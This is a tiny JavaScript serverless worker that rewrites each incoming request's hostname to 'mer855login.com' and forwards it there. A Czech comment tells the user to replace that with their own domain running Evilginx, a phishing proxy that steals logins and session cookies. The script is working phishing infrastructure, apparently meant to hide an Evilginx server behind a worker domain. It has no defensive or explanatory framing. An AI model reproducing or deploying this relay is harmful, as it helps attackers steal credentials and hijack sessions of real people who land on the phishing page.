export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    // TADY ZMĚŇ DOMÉNU NA TVOJI DOMÉNU, KDE BĚŽÍ EVILGINX
    url.hostname = 'mer855login.com'; 
    
    const newRequest = new Request(url, request);
    return fetch(newRequest);
  },
};
